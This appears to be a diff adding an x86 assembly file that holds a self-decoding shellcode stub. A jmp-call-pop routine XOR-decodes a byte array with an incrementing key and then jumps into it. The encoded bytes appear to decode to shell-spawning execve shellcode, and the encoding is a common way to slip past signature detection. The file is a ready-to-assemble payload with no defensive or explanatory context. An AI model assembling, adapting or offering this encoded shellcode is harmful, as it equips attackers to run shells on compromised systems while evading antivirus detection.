@@ -1,0 +1,30 @@
+global _start
+
+section .text
+_start:
+	xor ebx, ebx
+	jmp short notshellcode
+
+savestate:
+	pop esi
+	mov bl, 0xC4
+
+
+decode:
+	xor byte [esi], bl ; XOR current byte with bl
+
+	inc esi ; Move to next byte of encoded shellcode
+
+	cmp byte [esi], 0xbb ; Check if we hit the end of the shellcode
+	jz shellcode	; Jump to shellcode if yes
+
+	inc bl	; Increment XOR byte
+
+	jmp short decode ; Jmp to decoder routine.
+
+	; Repeat until last byte is hit
+
+
+notshellcode:
+	call savestate
+	shellcode: db 0xf5,0x05,0x96,0xaf,0xaa,0xa8,0xb9,0xa3,0xa4,0xaf,0xa7,0xa1,0xff,0xb9,0xfd,0xfc,0xfb,0xfa,0x5f,0x34,0x88,0x50,0x38,0x88,0x55,0x3c,0x6e,0xd4,0x2d,0x61,0xbb
